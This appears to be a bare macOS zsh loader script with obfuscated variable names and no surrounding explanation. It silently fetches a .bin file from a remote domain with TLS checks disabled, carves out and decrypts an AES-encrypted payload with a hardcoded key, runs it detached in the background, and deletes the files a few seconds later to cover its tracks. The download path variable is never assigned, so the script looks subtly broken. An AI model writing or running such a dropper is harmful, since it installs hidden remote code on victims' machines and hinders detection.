#!/bin/zsh
ve57a=$(mktemp /tmp/rzq34u.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m904301db5b449a34.bin" -o "$ve57az" || exit 1
qzu8ws=$(stat -f %z "$ve57az"); yy35nkj=$(( qzu8ws - 3156 - 205 ))
tail -c +$(( 3156 + 1 )) "$ve57az" | head -c $yy35nkj | openssl enc -d -aes-256-cbc -k b063bb28339d36a0c3722ca4 -out "$ve57a" 2>/dev/null
[ -s "$ve57a" ] && chmod 700 "$ve57a" && ( "$ve57a" & ) && disown
( sleep 3; rm -f "$ve57a" "$ve57az" ) &>/dev/null &
